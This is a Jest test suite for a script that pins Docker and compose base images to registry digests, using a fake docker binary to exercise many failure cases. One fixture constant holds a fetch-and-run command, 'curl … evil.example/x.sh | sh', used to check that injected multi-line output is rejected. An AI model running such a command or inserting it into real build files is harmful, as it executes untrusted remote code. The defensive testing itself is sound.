/**
 * scripts/capture-image-digests.sh 的行为回归（供应链钉版脚本）
 *
 * 这个脚本的职责是**供应链完整性**：把 Dockerfile / compose 的基础镜像从可变 tag
 * 换成 registry digest。它的失效形态恰好都是"看起来成功"：
 *   - `sed` 没匹配到任何内容时退出码仍是 0 ⇒ 已钉过之后再跑一次会报"已替换"而一字未改；
 *     而 Dockerfile 里的 tag 若与脚本顶部常量漂移，同样静默跳过 ⇒ 未钉版的镜像引用
 *     被当成"已按 digest 固定"提交上去；
 *   - `docker inspect --format='{{index .RepoDigests 0}}'` 对 build/load 来的镜像
 *     可能返回 `<no value>` 或空 ⇒ 直接写进 Dockerfile 会得到 `FROM <no value>`，
 *     失败推迟到构建期，且现场看起来"已经钉过版"；
 *   - **RepoDigests 条目天生不带 tag**（`docker.io/library/node@sha256:…`），旧脚本把整串
 *     当钉版引用写入 ⇒ 可读 tag 消失，产物被本仓的钉版门禁 `baseImageDigestPinned` 判红；
 *   - 判据用"子串匹配"而不是"值的位置"：`已是 tag@sha256:…` 的行**包含**脚本常量
 *     `FROM node:22.14.0-alpine` 这个前缀，于是旧实现把已钉版仓库放行到落笔，产出
 *     `…@sha256:新@sha256:旧` 的双 digest 并打印"已替换并校验"
 *     （2026-10-03 对着真实 Dockerfile 实测复现，三条 FROM 全中招）；
 *   - 反过来，"已钉"被判成错误又会把**混合仓库**变成死路：本仓库今天的真实状态是
 *     Dockerfile 三条 FROM 全钉、compose 的 mongo 没钉，旧实现第一步就退出 ⇒ compose
 *     永远钉不上，而 `baseImageDigestPinned` 的文件头把"跑本脚本重新捕获"写成唯一升级路径。
 *
 * 现在脚本按**指令行的值 token** 分类，四个处置各有对应期望（本文件逐条覆盖）：
 *   待钉 bare      → 钉上；已钉 same → 该目标跳过（不改字节、不报错）；
 *   待刷新 refresh → 换成刚捕获的 digest（上游滚动同名 tag 的升级路径，注释里的示例一起跟上）；
 *   够不着（--platform= 前缀 / 引号包裹 / 序列项 / 折叠标量 / 变量展开 / tag 与 @ 之间夹空白 /
 *   无 tag 的纯 digest / tag 漂移 / 同名但带命名空间前缀）→ 停手、零写入、打印行号。
 * 整体 no-op（两个目标都已钉成刚捕获的 digest）仍然是错误。
 *
 * 2026-10-04 一轮变异测试（把脚本逐个改坏、看闸是否变红）暴露了三件事，都已在下面做成断言：
 *   ① **"够不着"只在全部行都够不着时才报**：混合写法（一条 `FROM --platform=… node:tag` +
 *      一条正常 FROM）被分类器当成"不相干的行"放过，脚本打印"钉好 1 条 / 已替换并校验"，
 *      文件里却留着一条可变 tag。这是本脚本最坏的一类失效（把没做完说成做完了）的具体形状。
 *   ② **失败臂只判 `rc !== 0`**：把脚本换成一份语法错误的文件时，14 条"必须拒绝"的用例
 *      全部照绿（它们只看非零，不看是谁在说话）。现在每条臂都判**精确退出码 + 原因文案 +
 *      行号**，脚本坏掉就红。
 *   ③ **digest 的"长度"判据从没被单独测过**：旧夹具用 `sha256:short`，它同时违反字符集与
 *      长度，于是把 `{64}` 改成 `+`（任意长度）或允许大写，闸都不会红。
 * 另外补三条同根边界：CRLF 行尾（两种平台结果不一致 ⇒ 拒绝而不是静默重写整份文件）、
 * 多行 `RepoDigests` 输出（形状判据按行匹配，一行合法就整段放行，载荷还会被打进运维的粘贴块）、
 * 信号必须真的终止（旧 trap 只清残留不退出，Ctrl-C 之后照样写完两个文件并报 rc=0）。
 *
 * 全部由真跑证明（PATH 里插 docker stub），不用扫源码文本 —— 同仓 backup-mongo.sh
 * 的既有覆盖就是文本契约，证明不了任何运行时行为。
 * 唯一的例外是下面那条把 `repo_of_ref`/`norm_repo` 抽出来单独跑的：带端口的私有 registry
 * 引用没法只靠 --root 夹具喂进真跑，而它正是仓库名对账最容易判错的一侧。
 *
 * 平台前提：需要 POSIX sh；探测不到时整组显式跳过并打印原因（CI ubuntu 真跑）。
 * CI 上"探不到 sh"不允许转成 38 skipped 的绿，见下面那条单独的用例。
 */

'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawnSync } = require('child_process');

const ROOT = path.resolve(__dirname, '../..');
const SCRIPT = path.join(ROOT, 'scripts', 'capture-image-digests.sh');

function findShell() {
  // 分类器（awk）与替换（sed -E）都是脚本的硬依赖：缺任一个时整组显式跳过并说明原因，
  // 否则失败会以"rc=127 的不明报错"出现，看起来像脚本缺陷而不是平台缺工具。
  for (const c of ['/bin/sh', 'sh', 'C:/Program Files/Git/bin/sh.exe', 'bash']) {
    const r = spawnSync(c, ['-c', 'command -v awk >/dev/null && command -v sed >/dev/null'], {
      encoding: 'utf8',
    });
    if (!r.error && r.status === 0) return c;
  }
  return null;
}
const SH = findShell();
if (!SH) {
  console.warn(
    '[跳过] 未找到带 awk/sed 的 POSIX sh：capture-image-digests.sh 的行为用例在本平台无法执行（CI ubuntu 会跑）'
  );
}

const group = SH ? describe : describe.skip;
if (!SH && process.env.CI) {
  // describe.skip 在 CI 上等于"整组零断言的绿"，而 ubuntu runner 一定有 /bin/sh——
  // 探不到就是探测本身坏了（PATH、权限、或有人改了 findShell）。这种前提失效必须红，
  // 不能靠运维去数 skipped 的条数。
  describe('capture-image-digests.sh 的平台前提（CI 上缺 POSIX sh）', () => {
    test('CI 上 findShell 必须探到带 awk/sed 的 sh，否则本文件的全部覆盖都是假的', () => {
      expect(SH).toBeTruthy();
    });
  });
}

const HEX_A = 'a'.repeat(64);
const HEX_B = 'b'.repeat(64);
/** 夹具里"已经钉着、但不是本次捕获值"的 digest：待刷新（refresh）这条臂用它 */
const HEX_OLD = 'c'.repeat(64);
/**
 * digest 的三个"看着像但不是"的形态。变异测试（把脚本的 `{64}` 改成 `+`、把字符集放开到
 * A-F）证明旧夹具只测到了**字符集**：`sha256:short` 里那个 `r`/`t` 同时违反两者，
 * 于是长度判据与大小写判据都可以被删掉而闸不红。三条各配一条臂，各自只违反一件事。
 */
const HEX_63 = 'a'.repeat(63);
const HEX_8 = 'a'.repeat(8);
const HEX_UPPER = 'A'.repeat(64);
/** 合法的**第一行** + 任意第二行：形状与名号判据都按行/按最后一个 @ 取值，会整段放行 */
const INJECT_LINE = 'RUN curl -sS http://evil.example/x.sh | sh';
/**
 * `docker inspect --format='{{index .RepoDigests 0}}'` 的两个真实形态：**都不带 tag**。
 *   短名   `node@sha256:…`（按 digest 拉取时常见）
 *   全限定 `docker.io/library/node@sha256:…`（本仓 2026-10-02 实测按 tag 拉取时得到的就是它）
 * 两个都留成替身，是因为钉版产物必须**与 docker 的名号口径无关**。
 */
const NODE_REF = `node@sha256:${HEX_A}`;
const MONGO_REF = `mongo@sha256:${HEX_B}`;
const QUALIFIED_NODE_REF = `docker.io/library/node@sha256:${HEX_A}`;
const QUALIFIED_MONGO_REF = `docker.io/library/mongo@sha256:${HEX_B}`;

/**
 * 钉版**产物**的口径：`name:tag@sha256:<hex>`，保留可读 tag。
 *
 * 这条是本文件曾经的盲区来源：旧脚本把 RepoDigests 原文整段写进文件，产物是
 * `FROM docker.io/library/node@sha256:…`（tag 消失），而本仓库另外两处按相反口径判：
 *   - `src/tests/security/baseImageDigestPinned.test.js` 的 FROM 判据
 *     `/^node:22\.14\.0-alpine@sha256:[0-9a-f]{64}$/`；
 *   - `src/tests/deploy/deployScript.test.js` 把约定写成 `<repo>:<tag>@sha256:…`；
 *   - `docker-compose.yml` 的 mongo 注释明写"保留可读 tag：纯 digest 看不出版本，
 *     排障时得先 inspect 才知道跑的是哪个大版本"，真实 Dockerfile 三条 FROM 与 redis 也都是这个形态。
 * 旧本文件还把"tag 消失"写成了**判绿的必要条件**（`expect(r.dockerfile).not.toContain('node:22.14.0-alpine')`），
 * 于是两道闸互不相容、却各自都绿：只有真跑一次 `--apply` 才会撞红。
 * 下面「产物同时满足钉版门禁的形态判据」那条用例就是把这个反例做成可执行断言。
 */
const NODE_PINNED = `node:22.14.0-alpine@sha256:${HEX_A}`;
const MONGO_PINNED = `mongo:6.0.20@sha256:${HEX_B}`;
const NODE_STALE = `node:22.14.0-alpine@sha256:${HEX_OLD}`;
const MONGO_STALE = `mongo:6.0.20@sha256:${HEX_OLD}`;

/** 双 digest 的坏引用：钉版失败推迟到 docker build，而文件"看起来已经钉过" */
const DOUBLE_DIGEST = /@sha256:[0-9a-f]{64}@sha256:/;

/** docker 替身：按模式返回正常 digest / `<no value>` / 空 / 名字对不上 / 坏 digest 形态；并把调用记进日志 */
const DOCKER_STUB = `#!/bin/bash
echo "docker $*" >> "$STUB_LOG"
if [ -n "\${DOCKER_STUB_SLEEP:-}" ]; then sleep "\${DOCKER_STUB_SLEEP:-}"; fi
sub="$1"
case "$sub" in
  info) exit 0 ;;
  pull) exit 0 ;;
  inspect)
    case "$DOCKER_STUB_MODE" in
      novalue) echo "<no value>" ;;
      empty)   echo "" ;;
      wrongarch) echo "node@sha256:short" ;;
      hex63)   echo "node@sha256:${HEX_63}" ;;
      hex8)    echo "node@sha256:${HEX_8}" ;;
      upper)   echo "node@sha256:${HEX_UPPER}" ;;
      multiline) printf 'mongo@sha256:%s\\n%s\\n' "${HEX_B}" "${INJECT_LINE}" ;;
      wrongname) echo "docker.io/library/alpine@sha256:${HEX_A}" ;;
      qualified)
        case "$*" in
          *node:*) echo "${QUALIFIED_NODE_REF}" ;;
          *)       echo "${QUALIFIED_MONGO_REF}" ;;
        esac ;;
      *)
        case "$*" in
          *node:*) echo "${NODE_REF}" ;;
          *)       echo "${MONGO_REF}" ;;
        esac
    esac
    exit 0 ;;
esac
exit 0
`;

/**
 * 从脚本源码里切出一个 shell 函数体（`name() {` 到下一个独占一行的 `}`）。
 * 只用于把仓库名归一那两个纯函数单独跑一遍：脚本常量写死在文件顶部，
 * 带端口的私有 registry 引用**没法通过 --root 夹具喂进真跑**，而那正是对账逻辑
 * 最容易判错的一侧（从第一个冒号截断就会把 registry 名当成仓库名）。
 * 切片而不是重写：判据必须来自同一份源码，抄一遍就成了测我自己的副本。
 */
function extractFn(name) {
  const src = fs.readFileSync(SCRIPT, 'utf8').split(/\r?\n/);
  const start = src.findIndex((line) => line === `${name}() {`);
  expect(start).toBeGreaterThan(-1);
  const end = src.slice(start + 1).findIndex((line) => line === '}');
  expect(end).toBeGreaterThan(-1);
  return src.slice(start, start + 1 + end + 1).join('\n');
}

const tracked = [];
afterAll(() => {
  for (const d of tracked) fs.rmSync(d, { recursive: true, force: true });
});

/**
 * 零串扰自检：本套件跑的是一个**会改文件**的脚本，而它的默认 ROOT 是脚本自身的仓库根。
 * 实测踩过：一次漏传 --root 的 --apply 把假 digest 直接写进了真实 Dockerfile
 * 与 docker-compose.yml（3 处 FROM + 1 处 image + 1 处注释），当场靠 git diff 定位后
 * 定点复原。所以这里把"没有碰到真实文件"变成断言，而不是靠我记得传参。
 */
const REAL_TARGETS = ['Dockerfile', 'docker-compose.yml'];
const realSha = () =>
  Object.fromEntries(
    REAL_TARGETS.map((f) => [f, fs.readFileSync(path.join(ROOT, f)).toString('base64')])
  );
let realBefore;
beforeAll(() => {
  realBefore = realSha();
});
afterAll(() => {
  expect(realSha()).toEqual(realBefore);
});

/** 造一个仓库副本夹具：两阶段 Dockerfile + 含 mongo 的 compose */
function fixture() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'digests-'));
  tracked.push(dir);
  const bin = path.join(dir, 'bin');
  fs.mkdirSync(bin);
  const dockerPath = path.join(bin, 'docker');
  fs.writeFileSync(dockerPath, DOCKER_STUB, { mode: 0o755 });
  try {
    fs.chmodSync(dockerPath, 0o755);
  } catch (_) {
    /* Windows 上 mode 参数已足够 */
  }
  const dockerfile =
    'FROM node:22.14.0-alpine AS builder\nRUN echo build\n' +
    'FROM node:22.14.0-alpine AS runner\nUSER nodejs\n';
  // 注释里也放一份同样的字面串：真实 compose 就是这样（"把输出追加为
  // `image: mongo:6.0.20@sha256:<捕获值>`"），用来验"只改指令行、不改注释"。
  const compose =
    'services:\n  mongo:\n    # 用法示例：image: mongo:6.0.20@sha256:<捕获值>\n' +
    '    image: mongo:6.0.20\n  app:\n    image: x\n';
  fs.writeFileSync(path.join(dir, 'Dockerfile'), dockerfile, 'utf8');
  fs.writeFileSync(path.join(dir, 'docker-compose.yml'), compose, 'utf8');
  return { dir, log: path.join(dir, 'argv.log'), dockerfile, compose };
}

/**
 * 缺文件也要能读：`--root` 指向一个缺 Dockerfile 的目录是本脚本的一条独立失败臂
 * （"目标不存在"和"够不着"是两回事），而 run() 原先无条件 readFileSync，测试只能在
 * 脚本跑完之后自己再拼一次读文件——那会把"脚本没碰它"和"那个文件根本不存在"混成一条异常。
 */
const readOr = (p) => (fs.existsSync(p) ? fs.readFileSync(p, 'utf8') : null);

function run(fx, args, mode = 'good') {
  // 防呆：任何会改文件的调用都被强制隔离到夹具目录，除非该次调用显式给了 --root
  const withRoot = args.some((a) => a.startsWith('--root=')) ? args : ['--root=<ROOT>', ...args];
  const env = {
    ...process.env,
    PATH: `${path.join(fx.dir, 'bin')}${path.delimiter}${process.env.PATH}`,
    STUB_LOG: fx.log,
    DOCKER_STUB_MODE: mode,
  };
  const r = spawnSync(SH, [SCRIPT, ...withRoot.map((a) => a.replace('<ROOT>', fx.dir))], {
    env,
    encoding: 'utf8',
  });
  return {
    code: r.status,
    out: (r.stdout || '') + (r.stderr || ''),
    dockerfile: readOr(path.join(fx.dir, 'Dockerfile')),
    compose: readOr(path.join(fx.dir, 'docker-compose.yml')),
    // 临时文件也是产物的一部分：它既是"预演过"的证据，也是下一次运行的门禁
    // （脚本拒绝覆盖已存在的同名文件）。失败矩阵用"应当为空"、
    // 残留用例用"应当看得见"，两边共用同一个过滤器 ⇒ 见下面那条非空集自证。
    tmps: fs
      .readdirSync(fx.dir)
      .filter((f) => f.endsWith('.pin.tmp'))
      .sort(),
    calls: fs.existsSync(fx.log)
      ? fs.readFileSync(fx.log, 'utf8').split(/\r?\n/).filter(Boolean)
      : [],
  };
}

/**
 * docker 调用序列（`<子命令> <引用>`，引用取行的最后一个字段）。
 *
 * why 不是"条数 ≥ 4"：条数判据挡不住两类真实缺陷——**从不 pull mongo 就直接 inspect**
 * （本地恰好有旧镜像时照样能拿到一个 digest，钉出来的却是过期摘要），以及 inspect 早于
 * pull（取到的是 pull 之前的 RepoDigests）。这两个都在序列里，不在条数里。
 * inspect 的 `--format={{index .RepoDigests 0}}` 本身带空格，所以只取首尾两格。
 */
const callSeq = (r) =>
  r.calls.map((line) => {
    const t = line
      .replace(/^docker\s+/, '')
      .trim()
      .split(/\s+/);
    return t.length === 1 ? t[0] : `${t[0]} ${t[t.length - 1]}`;
  });

const writeDockerfile = (fx, body) =>
  fs.writeFileSync(path.join(fx.dir, 'Dockerfile'), body, 'utf8');
const writeCompose = (fx, body) =>
  fs.writeFileSync(path.join(fx.dir, 'docker-compose.yml'), body, 'utf8');

/**
 * 把 compose 的 mongo **指令行**换成常量表里没有的 tag。
 * 注释里那份演示保持原样：分类器只看指令行的值位置，注释是给人读的示例。
 */
const driftCompose = (src) => src.replace(/^ {4}image: mongo:6\.0\.20$/m, '    image: mongo:9.9.9');
const driftComposeTag = (fx) => writeCompose(fx, driftCompose(fx.compose));
const driftDockerfileTag = (fx) =>
  writeDockerfile(fx, fx.dockerfile.replace(/node:22\.14\.0-alpine/g, 'node:22.99.9-alpine'));

/**
 * 把两个目标都写成**已经钉成刚捕获的 digest** 的形态（`name:tag@sha256:<hex>`）。
 * 这一臂验的是两件事，它们是同一条边界的两侧：
 *   ① 钉版行仍然把脚本常量 `FROM node:22.14.0-alpine` 当**前缀**包含，旧判据用无边界子串
 *      匹配 ⇒ "可改"，旧替换又无边界 ⇒ 产出 `…@sha256:<新>@sha256:<旧>` 的双 digest
 *      并打印"已替换并校验"（2026-10-03 实测复现）；现在分类器认它是"已钉"，不动；
 *   ② 两个目标**都**已钉 ⇒ 本次没有任何事可做，必须报错而不是报成功（sed 无匹配仍返回 0
 *      的旧缺陷）。单个目标已钉不再是错误：见下面"混合仓库"那条。
 * 共同后置条件（文件逐字节不变 + 不留临时文件）由 checkFailure 统一执行。
 */
const pinEverything = (fx) => {
  writeDockerfile(fx, fx.dockerfile.replace(/node:22\.14\.0-alpine/g, NODE_PINNED));
  writeCompose(
    fx,
    fx.compose.replace(/^ {4}image: mongo:6\.0\.20$/m, `    image: ${MONGO_PINNED}`)
  );
};

/** 只钉 Dockerfile，compose 留裸 tag：本仓库 2026-10-04 的真实状态（混合仓库） */
const pinDockerfileOnly = (fx) =>
  writeDockerfile(fx, fx.dockerfile.replace(/node:22\.14\.0-alpine/g, NODE_PINNED));

/** 两个目标都钉在**别的** digest 上：上游滚动同名 tag 之后的升级路径（待刷新） */
const stalePinBoth = (fx) => {
  writeDockerfile(
    fx,
    `# 用法示例：docker pull ${NODE_STALE}\n` +
      fx.dockerfile.replace(/node:22\.14\.0-alpine/g, NODE_STALE)
  );
  writeCompose(fx, fx.compose.replace(/mongo:6\.0\.20\n/, `${MONGO_STALE}\n`));
};

/**
 * 「够不着」一族：值不在脚本能锚定的位置上。这类写法**必须停手**——
 * 静默跳过的产物是一份仍指向可变 tag 的引用，外加"我跑过钉版脚本"的印象。
 */
const platformDockerfile = (fx) =>
  writeDockerfile(fx, 'FROM --platform=$BUILDPLATFORM node:22.14.0-alpine AS builder\n');
const strayDockerfile = (fx) =>
  writeDockerfile(fx, `FROM node:22.14.0-alpine @sha256:${HEX_A} AS builder\n`);
const taglessDockerfile = (fx) =>
  writeDockerfile(fx, `FROM docker.io/library/node@sha256:${HEX_A}\n`);
const quotedCompose = (fx) => writeCompose(fx, 'services:\n  mongo:\n    image: "mongo:6.0.20"\n');
const seqCompose = (fx) => writeCompose(fx, 'services:\n  app:\n    - image: mongo:6.0.20\n');
const foldedCompose = (fx) =>
  writeCompose(fx, 'services:\n  mongo:\n    image: >-\n      mongo:6.0.20\n');
const varexpandCompose = (fx) =>
  writeCompose(fx, 'services:\n  mongo:\n    image: ${MONGO_IMAGE:-mongo:6.0.20}\n');

/**
 * 「一半够不着、一半够得着」——2026-10-04 变异测试找到的真实缺陷形状。
 * 上面那批"全部行都够不着"的臂只能撞上"找不到任何引用"这条兜底判据；一旦同文件里
 * 有一条正常行，分类器就把够不着的那行当**不相干的镜像**放过（它先看指令词，再取第一个
 * 字段，字段不是本镜像 ⇒ 跳过），于是脚本"钉好 1 条"并打印成功，文件里留着可变 tag。
 * 这两条臂是这条回归的唯一防线。
 */
const mixedPlatformDockerfile = (fx) =>
  writeDockerfile(
    fx,
    'FROM --platform=$BUILDPLATFORM node:22.14.0-alpine AS builder\n' +
      'FROM node:22.14.0-alpine AS runner\n'
  );
const mixedVarexpandCompose = (fx) =>
  writeCompose(
    fx,
    'services:\n  a:\n    image: ${MONGO_IMAGE:-mongo:6.0.20}\n  b:\n    image: mongo:6.0.20\n'
  );

/** `image:` 后面没有空白：值不在"指令词 + 空白"的位置上，YAML 里这行本身也不成立 */
const nobsCompose = (fx) => writeCompose(fx, 'services:\n  mongo:\n    image:mongo:6.0.20\n');

/** 同名但带命名空间前缀：常量里的 tag 完整地出现在行里，却不是**我们**的仓库 */
const prefixedCompose = (fx) =>
  writeCompose(fx, 'services:\n  mongo:\n    image: myorg/mongo:6.0.20\n');

/** CRLF 行尾：两种平台上结果不一致（MSYS 的 gawk/sed 吃 CR，Linux 不吃）⇒ 必须拒绝 */
const crlfBoth = (fx) => {
  writeDockerfile(fx, `${fx.dockerfile.replace(/\n/g, '\r\n')}`);
  writeCompose(fx, `${fx.compose.replace(/\n/g, '\r\n')}`);
};

const noMutation = () => {};
/** `--root` 指向的根不完整：目标文件根本不存在（与"够不着"是两条不同的失败臂） */
const deleteDockerfile = (fx) => fs.rmSync(path.join(fx.dir, 'Dockerfile'));
const deleteCompose = (fx) => fs.rmSync(path.join(fx.dir, 'docker-compose.yml'));

/**
 * 所有可达失败臂的**共同后置条件**：两个目标各自保持"本次运行开始前"的字节，
 * 目录里没有 `*.pin.tmp`（失败不许留 litter，成功也不留——见成功用例）。
 * 基准取"变异之后"的内容而不是夹具原文：漂移用例改的就是被检查的那个文件，
 * 拿夹具原文当基准会把"脚本没动"和"脚本把它改了回去"混成一条。
 *
 * 【为什么每行还带"精确退出码 + 原因文案"】变异测试实测：把这整张表跑在一份**语法错误**
 * 的脚本上（每个调用都 rc=2），14 条臂全部照绿——因为旧版只判 `rc !== 0`。"拒绝"必须是
 * **这个脚本、在这一行、因为这件事**拒绝，否则"闸在守"和"闸停了"输出一样。
 * 行号（`第 \d+ 行`）也写进判据：脚本对运维的全部定位能力就是那个行号，删掉它等于
 * 把"能定位的拒绝"退化成"要运维自己去找的拒绝"（这也是变异测试里存活的一条）。
 *
 * 行宽必须等于处理函数的形参个数：jest-each 少喂一格会把 `done` 当成第 N 个实参注入，
 * 用例既不通过也不失败，而是卡满 30s 超时（本仓实测踩过）。下面那条"表宽"用例钉住它。
 */
const failureArms = [
  [
    'Dockerfile tag 漂移',
    driftDockerfileTag,
    'good',
    ['--apply'],
    1,
    /第 \d+ 行的 tag 与脚本常量漂移/,
  ],
  ['compose tag 漂移', driftComposeTag, 'good', ['--apply'], 1, /第 \d+ 行的 tag 与脚本常量漂移/],
  [
    'digest 取不到（<no value>）',
    noMutation,
    'novalue',
    ['--apply'],
    1,
    /取不到 .* 的 registry digest/,
  ],
  [
    'digest 长度不足（伪 digest）',
    noMutation,
    'wrongarch',
    ['--apply'],
    1,
    /取不到 .* 的 registry digest/,
  ],
  [
    'digest 只有 63 位（字符集合规、长度不合规）',
    noMutation,
    'hex63',
    ['--apply'],
    1,
    /registry digest/,
  ],
  ['digest 只有 8 位（同上，短到一眼假）', noMutation, 'hex8', ['--apply'], 1, /registry digest/],
  [
    'digest 是大写十六进制（registry 只发小写，收下就是抄错）',
    noMutation,
    'upper',
    ['--apply'],
    1,
    /registry digest/,
  ],
  [
    'digest 输出多行（一行合法就整段放行，载荷会被打给运维）',
    noMutation,
    'multiline',
    ['--apply'],
    1,
    /行输出/,
  ],
  [
    'digest 属于别的镜像（RepoDigests 名号对不上）',
    noMutation,
    'wrongname',
    ['--apply'],
    1,
    /RepoDigests 仓库名是/,
  ],
  [
    '两个目标都已钉成刚捕获的 digest ⇒ 整体 no-op 不得报成功',
    pinEverything,
    'good',
    ['--apply'],
    1,
    /本次是 no-op/,
  ],
  ['未知参数', noMutation, 'good', ['--aply'], 2, /未知参数/],
  [
    'FROM --platform= 前缀（值不在能锚定的位置）',
    platformDockerfile,
    'good',
    ['--apply'],
    1,
    /第 \d+ 行提到了/,
  ],
  [
    '混合写法：一条 --platform= 前缀 + 一条正常 FROM ⇒ 不得"钉好 1 条"就算完',
    mixedPlatformDockerfile,
    'good',
    ['--apply'],
    1,
    /第 \d+ 行提到了/,
  ],
  [
    '混合写法：一条变量展开 + 一条正常 image ⇒ 同上',
    mixedVarexpandCompose,
    'good',
    ['--apply'],
    1,
    /第 \d+ 行提到了/,
  ],
  ['tag 与 @sha256 之间夹空白', strayDockerfile, 'good', ['--apply'], 1, /夹了空白/],
  [
    '无 tag 的纯 digest 钉版（旧实现写坏的形态）',
    taglessDockerfile,
    'good',
    ['--apply'],
    1,
    /没有可读 tag/,
  ],
  [
    '同名但带命名空间前缀（不是我们的仓库，也不该去钉别人的）',
    prefixedCompose,
    'good',
    ['--apply'],
    1,
    /命名空间前缀/,
  ],
  ['compose 值被引号包裹', quotedCompose, 'good', ['--apply'], 1, /第 \d+ 行提到了/],
  ['compose 序列项 - image:', seqCompose, 'good', ['--apply'], 1, /第 \d+ 行提到了/],
  ['compose 折叠标量', foldedCompose, 'good', ['--apply'], 1, /第 \d+ 行提到了/],
  ['compose 变量展开', varexpandCompose, 'good', ['--apply'], 1, /第 \d+ 行提到了/],
  [
    'compose 指令词后没有空白（image:mongo:6.0.20）',
    nobsCompose,
    'good',
    ['--apply'],
    1,
    /第 \d+ 行提到了/,
  ],
  [
    'CRLF 行尾（两种平台结果不一致 ⇒ 拒绝而不是静默重写整份文件）',
    crlfBoth,
    'good',
    ['--apply'],
    1,
    /CRLF 行尾/,
  ],
  [
    '--root 指过去缺 Dockerfile（"目标不存在"与"够不着"是两条臂）',
    deleteDockerfile,
    'good',
    ['--apply'],
    1,
    /找不到 Dockerfile：/,
  ],
  [
    '缺 docker-compose.yml ⇒ Dockerfile 只读分类过也不能落笔（检查先于动作）',
    deleteCompose,
    'good',
    ['--apply'],
    1,
    /找不到 docker-compose\.yml：/,
  ],
];

/**
 * 差分语料：每条都写满「输入 → 脚本自己声明的处置计划 → 逐字节期望产物」三格。
 *
 * 【它补的是哪一格】上面的用例都在判"结果对不对"，没有一条把**脚本声明的条数**和
 * **实际改了哪几行**对立起来。变异测试里存活最久的一支就是删掉 ② 的命名空间边界：
 * 产物仍然处处合法（别人仓库的注释示例被换成刚捕获的 digest ⇒ 注释从"别人的仓库"变成
 * 一张假证），plan 那行照样打印"待刷新 1 条"，而按形态写的判据全绿。
 * 只有逐字节期望产物能看见**多改的那一笔**，只有声明条数能看见**少报的那一笔**，
 * 所以三格必须同时写在一张表里才叫差分。
 *
 * 期望产物按**整串**比较而不是数行数：数行数会放过"改对了 A 行、同时改坏了 B 行"。
 */
const pinCorpus = [
  {
    name: '全裸 tag（本仓库改造前的形状）',
    dockerfile:
      'FROM node:22.14.0-alpine AS builder\nRUN echo build\nFROM node:22.14.0-alpine AS runner\nUSER nodejs\n',
    compose:
      'services:\n  mongo:\n    # 用法示例：image: mongo:6.0.20@sha256:<捕获值>\n    image: mongo:6.0.20\n  app:\n    image: x\n',
    dfPlan: { bare: 2, refresh: 0, same: 0 },
    cfPlan: { bare: 1, refresh: 0, same: 0 },
    wantDockerfile: `FROM ${NODE_PINNED} AS builder\nRUN echo build\nFROM ${NODE_PINNED} AS runner\nUSER nodejs\n`,
    wantCompose:
      'services:\n  mongo:\n    # 用法示例：image: mongo:6.0.20@sha256:<捕获值>\n' +
      `    image: ${MONGO_PINNED}\n  app:\n    image: x\n`,
  },
  {
    name: '混合仓库：Dockerfile 一半已钉、compose 整体跳过',
    dockerfile: `FROM ${NODE_PINNED} AS builder\nRUN echo build\nFROM node:22.14.0-alpine AS runner\n`,
    compose: `services:\n  mongo:\n    image: ${MONGO_PINNED}\n`,
    dfPlan: { bare: 1, refresh: 0, same: 1 },
    cfPlan: { bare: 0, refresh: 0, same: 1 },
    wantDockerfile: `FROM ${NODE_PINNED} AS builder\nRUN echo build\nFROM ${NODE_PINNED} AS runner\n`,
    wantCompose: `services:\n  mongo:\n    image: ${MONGO_PINNED}\n`,
  },
  {
    name: '待刷新：注释里的示例跟着换，但别人命名空间的示例一笔不碰',
    dockerfile: `# 用法示例：docker pull ${NODE_STALE}\nFROM ${NODE_STALE} AS builder\nFROM node:22.14.0-alpine AS runner\n`,
    compose:
      'services:\n  mongo:\n    # 别人的仓库：image: myorg/mongo:6.0.20@sha256:' +
      `${HEX_OLD}\n    image: mongo:6.0.20@sha256:${HEX_OLD}\n`,
    dfPlan: { bare: 1, refresh: 1, same: 0 },
    cfPlan: { bare: 0, refresh: 1, same: 0 },
    wantDockerfile: `# 用法示例：docker pull ${NODE_PINNED}\nFROM ${NODE_PINNED} AS builder\nFROM ${NODE_PINNED} AS runner\n`,
    wantCompose:
      'services:\n  mongo:\n    # 别人的仓库：image: myorg/mongo:6.0.20@sha256:' +
      `${HEX_OLD}\n    image: ${MONGO_PINNED}\n`,
  },
];

/** 脚本自己声明处置计划的那一行（每个目标恰好一条；缺失或多印都算判据坏掉） */
function planLine(out, label) {
  const lines = out.split(/\r?\n/).filter((l) => l.trim().startsWith(`${label}：`));
  expect(lines).toHaveLength(1);
  return lines[0];
}

function checkFailure(label, mutate, mode, args, wantCode, wantReason) {
  const fx = fixture();
  mutate(fx);
  const before = {
    dockerfile: readOr(path.join(fx.dir, 'Dockerfile')),
    compose: readOr(path.join(fx.dir, 'docker-compose.yml')),
  };
  const r = run(fx, args, mode);
  // 逐行取"错误："开头的行再比原因：整段输出比会匹配到跨行的文案（脚本的多行提示里
  // 每行都是独立 printf），而这个仓库的失败信息一律以"错误："起头且把结论放在第一行。
  expect({ arm: label, code: r.code, errs: r.out.match(/^\s*错误：.*$/gm) }).toMatchObject({
    code: wantCode,
    errs: expect.arrayContaining([expect.stringMatching(wantReason)]),
  });
  expect({ dockerfile: r.dockerfile, compose: r.compose, tmps: r.tmps }).toEqual({
    dockerfile: before.dockerfile,
    compose: before.compose,
    tmps: [],
  });
}

group('capture-image-digests.sh 真跑行为', () => {
  test('不加 --apply：只打印两个可粘贴的钉版引用，且一个文件都不改', () => {
    const fx = fixture();
    const before = { d: fx.dockerfile, c: fx.compose };
    const r = run(fx, []);
    expect(r.code).toBe(0);
    // 打印的必须是**产物口径**（name:tag@sha256:…），不是 RepoDigests 原文：
    // 这个模式的本意是"人工核对后自行替换"，打出来的串就是要粘进文件的那串。
    expect(r.out).toContain(NODE_PINNED);
    expect(r.out).toContain(MONGO_PINNED);
    expect(r.dockerfile).toBe(before.d);
    expect(r.compose).toBe(before.c);
    // 未 --apply 时不该出现"已替换"
    expect(r.out).not.toMatch(/已替换|→/);
  });

  test('--apply：两阶段 Dockerfile 与 compose 全部钉成 digest，tag 保留且不残留 RepoDigests 名号', () => {
    const fx = fixture();
    const r = run(fx, ['--apply']);
    expect({ code: r.code, out: r.out.slice(-160) }).toMatchObject({ code: 0 });
    // 两个 FROM 都要换（原实现用 g 标志，这条把它真的钉住）
    expect(r.dockerfile.split('FROM ').length - 1).toBe(2);
    expect(r.dockerfile.match(/@sha256:/g) || []).toHaveLength(2);
    expect(r.dockerfile).toContain(`FROM ${NODE_PINNED} AS builder`);
    expect(r.dockerfile).toContain(`FROM ${NODE_PINNED} AS runner`);
